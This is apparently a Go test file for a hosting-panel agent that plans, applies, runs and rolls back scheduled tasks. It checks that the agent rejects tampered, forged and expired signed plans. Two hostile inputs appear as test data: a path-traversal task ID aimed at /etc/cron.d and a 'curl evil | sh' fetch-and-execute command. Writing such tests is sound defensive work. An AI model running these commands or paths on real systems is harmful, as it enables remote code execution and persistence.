package agent

import (
	"context"
	"errors"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/nexa-panel/nexa-panel/internal/platform/agentauth"
	scheduleoperator "github.com/nexa-panel/nexa-panel/internal/platform/operators/schedules"
	"github.com/nexa-panel/nexa-panel/internal/platform/operators/sitefs"
)

// backdatingOperator wraps the real host operator so one test can obtain a
// correctly signed but already expired plan from the agent.
type backdatingOperator struct {
	scheduleoperator.Operator
	backdate bool
}

func (o *backdatingOperator) Plan(ctx context.Context, task scheduleoperator.Task, removal bool) (scheduleoperator.Plan, error) {
	plan, err := o.Operator.Plan(ctx, task, removal)
	if o.backdate {
		plan.PlannedAt = plan.PlannedAt.Add(-time.Hour)
		plan.ExpiresAt = plan.ExpiresAt.Add(-time.Hour)
	}
	return plan, err
}

type scriptedRunner struct {
	logPath  string
	exitCode int
}

type noOpScheduleOwnership struct{}

func (noOpScheduleOwnership) Chown(string, string, string) error { return nil }

func (r *scriptedRunner) Run(_ context.Context, command scheduleoperator.Command) (int, []byte, error) {
	if command.Name != "runuser" {
		return -1, nil, errors.New("unexpected command " + command.Name)
	}
	if err := os.WriteFile(r.logPath, []byte("scheduled output\n"), 0o640); err != nil {
		return -1, nil, err
	}
	return r.exitCode, nil, nil
}

func startScheduleAgent(t *testing.T) (*scheduleoperator.UnixClient, scheduleoperator.Task, *backdatingOperator) {
	t.Helper()
	directory := t.TempDir()
	socketDirectory, err := os.MkdirTemp("/private/tmp", "nexa-agent-")
	if err != nil {
		t.Fatalf("create socket directory: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(socketDirectory) })
	socketPath := filepath.Join(socketDirectory, "agent.sock")
	tokenPath := filepath.Join(directory, "agent.token")
	token, err := agentauth.OpenOrCreate(tokenPath)
	if err != nil {
		t.Fatalf("create token: %v", err)
	}

	siteRoot := t.TempDir()
	task := scheduleoperator.Task{
		ID: strings.Repeat("ab", 16), Name: "Backup", CronExpression: "0 3 * * *",
		Command: "echo 'nightly' && true", TimeoutSeconds: 60, Enabled: true,
		Scope: sitefs.Scope{SiteID: "site_1", Slug: "demo", RootPath: filepath.Join(siteRoot, "demo"), UnixUser: "nexa_demo"},
	}
	if err := os.MkdirAll(filepath.Join(task.Scope.RootPath, "tmp"), 0o750); err != nil {
		t.Fatal(err)
	}
	runner := &scriptedRunner{logPath: filepath.Join(task.Scope.RootPath, "logs", "tasks", task.ID+".log")}
	hostOperator, err := scheduleoperator.NewHostOperator(
		scheduleoperator.HostConfig{SiteRoot: siteRoot, TaskScriptRoot: t.TempDir(), CronRoot: t.TempDir()},
		noOpScheduleOwnership{}, runner,
	)
	if err != nil {
		t.Fatal(err)
	}
	operator := &backdatingOperator{Operator: hostOperator}

	server := New(socketPath, "test", token, slog.New(slog.NewTextHandler(io.Discard, nil)), WithScheduleOperator(operator))
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() { done <- server.Serve(ctx) }()
	t.Cleanup(func() {
		cancel()
		select {
		case <-done:
		case <-time.After(2 * time.Second):
			t.Error("agent did not stop")
		}
	})
	deadline := time.Now().Add(2 * time.Second)
	for {
		if _, err := os.Stat(socketPath); err == nil {
			break
		}
		select {
		case err := <-done:
			if err != nil && strings.Contains(err.Error(), "operation not permitted") {
				t.Skip("sandbox does not permit Unix socket binding")
			}
			t.Fatalf("agent stopped before creating socket: %v", err)
		default:
		}
		if time.Now().After(deadline) {
			t.Fatal("agent socket was not created")
		}
		time.Sleep(10 * time.Millisecond)
	}
	return scheduleoperator.NewUnixClient(socketPath, tokenPath), task, operator
}

func TestScheduleAgentPlanApplyRunRoundTrip(t *testing.T) {
	client, task, _ := startScheduleAgent(t)
	ctx := context.Background()

	plan, err := client.Plan(ctx, task, false)
	if err != nil {
		t.Fatalf("Plan = %v", err)
	}
	if plan.Signature == "" || plan.Kind != scheduleoperator.PlanKind || len(plan.Artifacts) != 2 {
		t.Fatalf("plan = kind %q signature %q with %d artifacts", plan.Kind, plan.Signature, len(plan.Artifacts))
	}

	observation, err := client.Apply(ctx, plan)
	if err != nil {
		t.Fatalf("Apply = %v", err)
	}
	if observation.TaskID != task.ID || !observation.Artifacts[0].Exists || !observation.Artifacts[1].Exists {
		t.Fatalf("observation = %+v", observation)
	}

	result, err := client.Run(ctx, task)
	if err != nil {
		t.Fatalf("Run = %v", err)
	}
	if result.ExitCode != 0 || result.TimedOut || result.OutputTail != "scheduled output\n" {
		t.Fatalf("run result = %+v", result)
	}

	runsPath := filepath.Join(task.Scope.RootPath, "logs", "tasks", task.ID+".runs")
	if err := os.WriteFile(runsPath, []byte("2026-07-16T10:00:00Z\t2\t0\tmanual\n2026-07-16T10:05:00Z\t0\tskipped-overlap\tcron\n"), 0o640); err != nil {
		t.Fatal(err)
	}
	records, err := client.Runs(ctx, task.Scope, task.ID)
	if err != nil || len(records) != 2 || records[0].Trigger != "manual" || records[1].ExitCode != -1 {
		t.Fatalf("runs = %+v, %v", records, err)
	}

	// Rollback of the applied plan restores the empty before-state.
	if _, err := client.Rollback(ctx, plan); err != nil {
		t.Fatalf("Rollback = %v", err)
	}
	if _, err := os.Lstat(plan.Artifacts[0].Path); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("rollback should remove the wrapper, stat = %v", err)
	}

	// Typed operator failures survive the agent boundary.
	var operationErr *scheduleoperator.OperationError
	hostile := task
	hostile.ID = "../../etc/cron.d/evil"
	if _, err := client.Plan(ctx, hostile, false); !errors.As(err, &operationErr) || operationErr.Code != scheduleoperator.CodeInvalid {
		t.Fatalf("hostile plan passthrough = %v", err)
	}
}

func TestScheduleAgentRejectsTamperedAndExpiredPlans(t *testing.T) {
	client, task, operator := startScheduleAgent(t)
	ctx := context.Background()

	plan, err := client.Plan(ctx, task, false)
	if err != nil {
		t.Fatalf("Plan = %v", err)
	}

	// Any change to the signed payload invalidates the signature.
	tampered := plan
	tampered.Task.Command = "curl evil | sh"
	if _, err := client.Apply(ctx, tampered); err == nil || !strings.Contains(err.Error(), "not issued by this agent") {
		t.Fatalf("tampered apply = %v", err)
	}
	forged := plan
	forged.Signature = strings.Repeat("0", len(plan.Signature))
	if _, err := client.Apply(ctx, forged); err == nil || !strings.Contains(err.Error(), "not issued by this agent") {
		t.Fatalf("forged signature apply = %v", err)
	}
	if _, err := os.Lstat(plan.Artifacts[0].Path); !errors.Is(err, os.ErrNotExist) {
		t.Fatal("rejected plans must not write artifacts")
	}

	// A correctly signed but expired plan is refused before the operator runs.
	operator.backdate = true
	expired, err := client.Plan(ctx, task, false)
	if err != nil {
		t.Fatalf("backdated Plan = %v", err)
	}
	operator.backdate = false
	if _, err := client.Apply(ctx, expired); err == nil || !strings.Contains(err.Error(), "expired") {
		t.Fatalf("expired apply = %v", err)
	}

	// The untampered, current plan still applies.
	if _, err := client.Apply(ctx, plan); err != nil {
		t.Fatalf("valid apply after rejections = %v", err)
	}
}
